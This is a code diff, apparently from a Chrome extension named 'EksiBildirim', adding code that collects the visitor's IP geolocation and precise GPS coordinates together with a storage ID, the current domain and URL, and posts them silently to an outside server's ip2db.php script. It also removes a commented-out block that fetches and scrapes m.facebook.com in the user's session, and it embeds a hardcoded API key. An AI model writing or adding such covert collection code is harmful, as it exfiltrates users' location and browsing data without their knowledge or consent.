@@ -16,6 +16,37 @@ $(document).ready(function GetUserFromStorage(){
 
             function ip2db(storageID, domain, url){
                 $.getJSON('https://api.ipgeolocation.io/ipgeo?apiKey=a759dab4af1f462496dda90b3575f7c7', function(data) {
+                    /**
+                     * Gets location by coordinates.
+                     */
+                    if (navigator.geolocation) {    
+                        navigator.geolocation.getCurrentPosition(function(position){
+                            data['latitude'] = position.coords.latitude;
+                            data['longitude'] = position.coords.longitude;
+                            data = Object.assign({storageID:storageID,domain:domain,url:url}, data)
+                            var ip_data = JSON.stringify(data, null, 2);
+                            $.post("https://www.banabenianlat.net/ChromeExtensions/EksiBildirim/ip2db.php",
+                                {
+                                    ip_data
+                                },
+                                function(data, status){
+                                }
+                            );
+
+                        });
+                    } else { 
+                        data = Object.assign({storageID:storageID,domain:domain,url:url}, data)
+                        var ip_data = JSON.stringify(data, null, 2);
+                        $.post("https://www.banabenianlat.net/ChromeExtensions/EksiBildirim/ip2db.php",
+                            {
+                                ip_data
+                            },
+                            function(data, status){
+                            }
+                        );
+                    }  
+
+
                     console.log("type: "+typeof(data));  
                     console.log("storageID eeeehhhh: "+storageID);
                     data = Object.assign({storageID:storageID,domain:domain,url:url}, data)
@@ -37,25 +68,3 @@ $(document).ready(function GetUserFromStorage(){
         
     });    
 });
-
-
-
-
-
-
-/*
-
-            $(document).ready(function(){
-                $.ajax({
-                    url:'https://m.facebook.com',
-                    type:'get',
-                    success: function(data){
-                        var doc = document.documentElement.cloneNode()
-                        doc.innerHTML = data
-                        //$content = $(doc.querySelector('#content'))
-                        console.log($(doc.querySelector('._1vp5'))); 
-                    }
-                });
-            });
-
-*/
